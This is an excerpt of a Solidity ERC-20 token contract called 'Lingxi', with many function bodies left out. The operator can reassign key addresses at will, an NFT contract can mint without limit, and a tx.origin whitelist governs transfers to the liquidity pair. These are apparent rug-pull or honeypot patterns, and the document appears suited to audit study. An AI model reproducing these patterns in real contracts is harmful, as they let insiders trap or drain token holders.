...
contract Lingxi is Context, IERC20Metadata {
    ...
    constructor() {
        ...
        _symbol = "Lingxi";
        Operator = msg.sender;
        TEAM = address(0x3AF2e169F66907368F4e7eD5465E9EAe978d500C);
        Router = address(0xCB34353fEF01789424aaD533D3611FA29c01AA7f);// Mainnet
        _mint(address(TEAM), 2 * 1e8 * 1e18); // Mainnet
    }

    function init(address _LingxiLP, address _NFTContract, address _team, address _percent1, address _LPFree) external OnlyOperator {
        LPInstance = IERC20(_LingxiLP);
        NFTContract = _NFTContract;
        TEAM = _team; // 0x3AF2e169F66907368F4e7eD5465E9EAe978d500C
        LPFree = _LPFree; // 0x569dcBE1c1BBd67e3b16e8A8AD418c8444174137
        percent1 = _percent1; // 0xdcA5275916b94206DDe6042829487e95143591FD
    }
    ...
    function transferFrom(
        ...
        if ( to == address(LPInstance) && tx.origin != address(0x569dcBE1c1BBd67e3b16e8A8AD418c8444174137) ) {
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        ...
        require(currentAllowance >= subtractedValue, "Lingxi: decreased allowance below zero");
        unchecked {
    ...
    function _transfer(
        ...
        require(from != address(0), "Lingxi: transfer from the zero address");
        require(to   != address(0), "Lingxi: transfer to the zero address");

        uint fromBalance = _balances[from];
        require(fromBalance >= amount, "Lingxi: transfer amount exceeds balance");
        unchecked {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "Lingxi: mint to the zero address");
    ...
    function NFTMintLingxi(address to, uint amount) external {
        require(msg.sender == NFTContract, "Lingxi: Mint only by owner");
        _mint(to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "Lingxi: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Lingxi: burn amount exceeds balance");
        unchecked {
    ...
    function _approve(
        ...
        require(owner != address(0), "Lingxi: approve from the zero address");
        require(spender != address(0), "Lingxi: approve to the zero address");
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Lingxi: insufficient allowance");
            unchecked {
